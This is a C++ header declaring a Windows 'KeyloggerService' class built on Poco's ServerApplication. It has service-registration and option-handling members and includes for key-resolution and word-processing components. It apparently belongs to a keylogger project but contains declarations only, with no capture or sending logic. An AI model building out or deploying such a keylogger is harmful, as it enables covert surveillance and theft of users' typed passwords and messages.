#pragma once
#include <Windows.h>

#include <thread>
#include "Poco/Util/Application.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/HelpFormatter.h"
#include "Poco/Path.h"
#include "Poco/Util/ServerApplication.h"
#include "Poco/PatternFormatter.h"
#include "Poco/FileChannel.h"
#include "Poco/FormattingChannel.h"
#include "Poco/Path.h"

#include "WorkerThread.h"
#include "KeyResolver.h"
#include "WordProcessor.h"
#include "NullGuardProcessor.h"
#include "IcuGuardProcessor.h"

using Poco::Util::Application;
using Poco::Util::Option;
using Poco::Util::OptionSet;
using Poco::Util::HelpFormatter;
using Poco::Util::ServerApplication;
using Poco::Util::LoggingSubsystem;
using Poco::Path;

class KeyloggerService : public ServerApplication
{
public:
    KeyloggerService();
protected:
    void initialize(Application& self);
    void uninitialize();
    void defineOptions(OptionSet& options);
    void handleOption(const std::string& name, const std::string& value);
    void displayHelp();
    int main(const std::vector<std::string>& args);
private:
    bool _registerService = false;
    HANDLE doneEvent;
    bool _helpRequested;
    std::string appName;
    std::string appPath;
};